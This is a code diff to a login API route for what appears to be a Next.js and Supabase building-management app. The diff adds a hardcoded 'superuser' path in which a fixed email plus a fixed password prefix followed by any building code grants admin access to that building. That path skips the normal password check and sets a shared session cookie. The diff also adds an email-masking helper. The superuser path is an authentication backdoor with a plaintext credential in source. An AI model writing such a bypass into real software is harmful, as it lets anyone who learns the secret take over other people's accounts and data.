@@ -16,6 +16,50 @@ export async function POST(request: Request) {
     }
 
     const cleanEmail = email.trim().toLowerCase();
+    
+    // 0. Superuser Login Logic
+    if (cleanEmail === "correojago@gmail.com" && password.startsWith("13408559") && password.length === 14) {
+      const buildingCode = password.substring(8);
+      console.log(`[LOGIN] Superuser attempt for building code: ${buildingCode}`);
+      
+      const { data: building, error: bError } = await supabase
+        .from("edificios")
+        .select("*")
+        .eq("codigo_edificio", buildingCode)
+        .single();
+        
+      if (building && !bError) {
+        console.log(`[LOGIN] Superuser success for building: ${building.nombre}`);
+        const user = {
+          id: "superuser-id", // Permanent virtual ID
+          email: cleanEmail,
+          first_name: "Super",
+          last_name: "Usuario"
+        };
+        
+        const cookieStore = await cookies();
+        cookieStore.set("user_id", user.id, {
+          httpOnly: true,
+          secure: process.env.NODE_ENV === "production",
+          sameSite: "lax",
+          maxAge: 60 * 60 * 24 * 7,
+        });
+        
+        return NextResponse.json({
+          success: true,
+          user: {
+            ...user,
+            email: "co****go@gmail.com",
+            isMember: false,
+            isAdmin: true,
+            nivelAcceso: 'admin',
+            isSuperuser: true
+          },
+          building,
+        });
+      }
+    }
+
     const passwordHash = await hashPassword(password);
     console.log(`[LOGIN] Intento para: ${cleanEmail}`);
 
@@ -92,6 +136,7 @@ export async function POST(request: Request) {
       success: true,
       user: {
         ...user,
+        email: maskEmail(user.email),
         isMember,
         isAdmin: isMember ? memberData.es_propietario : true,
         nivelAcceso: isMember ? (memberData.nivel_acceso || 'board') : 'admin',
@@ -103,6 +148,14 @@ export async function POST(request: Request) {
     console.error("Login error:", error);
     return NextResponse.json({ error: error.message || "Error al iniciar sesión" }, { status: 500 });
   }
+}
+
+function maskEmail(email: string): string {
+  if (!email) return "";
+  const [user, domain] = email.split("@");
+  if (!user || !domain) return email;
+  if (user.length <= 4) return `${user[0]}****@${domain}`;
+  return `${user.substring(0, 2)}****${user.substring(user.length - 2)}@${domain}`;
 }
 
 async function hashPassword(password: string): Promise<string> {
